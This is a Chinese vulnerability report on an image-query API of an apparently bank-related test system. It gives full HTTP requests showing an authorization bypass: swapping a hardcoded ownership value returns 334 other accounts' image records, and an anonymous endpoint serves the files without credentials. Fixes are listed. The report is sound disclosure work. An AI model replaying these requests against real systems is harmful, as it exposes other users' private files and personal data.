# 影像系统存在水平越权漏洞

**漏洞名称：** 影像系统存在水平越权漏洞

**漏洞等级：** 严重

**漏洞类型：** 水平越权 / 对象级授权缺失

**漏洞URL：**

`https://ttt.ebanktest.com.cn:18312/oscf/thirdparty/zeus-image/services/queryImageSystemPageInfoWithToken`

## 详细描述

影像查询接口只校验请求是否带有会话，不校验请求体中的 `imageSystemRelation` 是否属于当前企业。普通企业账号使用自己的归属值查询时结果为空，但把该参数换成前端硬编码的共享值后，一次请求返回 334 条影像记录，涉及 196 个其他账号。

返回数据包含其他账号的 `userId`、`userName`、影像编号和文件存储名。拿到 `imageSystemUrl` 后，访问 `anonymous` 下载接口不需要任何 Token、Cookie 或租户头，即可返回他人影像原文件。

## 复现步骤

前置条件：一个普通企业账号的 `zeus-token`，租户为 `tenant-id: 803`，系统为 `sys-id: 001`。

### 第 1 步：用本企业归属值查询，确认本来没有数据

完整请求包：

```http
POST /oscf/thirdparty/zeus-image/services/queryImageSystemPageInfoWithToken HTTP/1.1
Host: ttt.ebanktest.com.cn:18312
zeus-token: <普通企业账号的会话令牌>
tenant-id: 803
sys-id: 001
Content-Type: application/json;charset=UTF-8
Content-Length: 68
Connection: close

{"imageSystemRelation":"1361626663677998","pageNum":1,"pageSize":20}
```

响应包：

```http
HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8

{"success":true,"data":{"total":"0","list":[],"pageSize":20,"pageNum":1}}
```

`total=0` 说明当前账号用自己的归属值看不到影像，后面的数据不是“本来就有权限看”的数据。

### 第 2 步：替换为前端硬编码的共享归属值，批量读取他人影像

完整请求包：

```http
POST /oscf/thirdparty/zeus-image/services/queryImageSystemPageInfoWithToken HTTP/1.1
Host: ttt.ebanktest.com.cn:18312
zeus-token: <普通企业账号的会话令牌>
tenant-id: 803
sys-id: 001
Content-Type: application/json;charset=UTF-8
Content-Length: 69
Connection: close

{"imageSystemRelation":"1225645122356412","pageNum":1,"pageSize":999}
```

响应包：

```http
HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8

{"success":true,"data":{"total":"334","list":[{"imageSystemId":"1156611961323523","imageSystemCode":"YXBH1333013423763466","imageSystemUrl":"l7oV6sxYpoOnQmnHam46UcZInZJuVle37RPe6bcso9B6s7AkkM31NHelJRPaCBcb","imageSystemSize":"6.60KB","dataSources":"供应链系统","userId":"1198699318943746","userName":"ceshi1","createTime":"2026-06-15","organizationName":null},{"imageSystemId":"1156611961323555","userId":"1283787037704194","userName":"gx123456","createTime":"2026-02-12","imageSystemSize":"13.88KB"},......（其余 332 条省略）......],"pageSize":999,"pageNum":1}}
```

响应中 `total=334`，`list` 包含 196 个不属于当前企业的 `userId/userName`，并且每条记录都带有可下载的 `imageSystemUrl`。

### 第 3 步：不带任何凭证读取他人影像原文件

完整请求包：

```http
GET /oscf/thirdparty/zeus-image-sftp/services/anonymous/l7oV6sxYpoOnQmnHam46UcZInZJuVle37RPe6bcso9B6s7AkkM31NHelJRPaCBcb HTTP/1.1
Host: ttt.ebanktest.com.cn:18312
Accept: */*
Connection: close
```

响应包：

```http
HTTP/1.1 200 OK
Content-Type: image/jpeg
Content-Disposition: attachment;filename=1333013423763465.jpg
Content-Length: 6757

<二进制 JPEG 响应体，共 6757 字节，前 4 字节为 ff d8 ff e0>
```

请求中没有 `zeus-token`、`tenant-id`、`sys-id` 或 Cookie，仍然返回真实图片字节；把路径换成不存在的 key 则返回 404，排除固定错误页。

## 影响范围

任意普通企业账号可以批量读取其他企业的影像元数据，并进一步读取原文件。已确认受影响数据为 334 条影像记录、196 个其他账号。

## 修复方案

1. 服务端根据当前会话主体过滤 `imageSystemRelation`，禁止客户端指定他人归属。
2. 关闭 `anonymous` 匿名下载入口；下载接口必须校验会话和文件归属。
3. 对查询、下载、导出接口统一做对象级授权测试：A 账号传 B 的对象 ID 必须返回 403 或空结果。
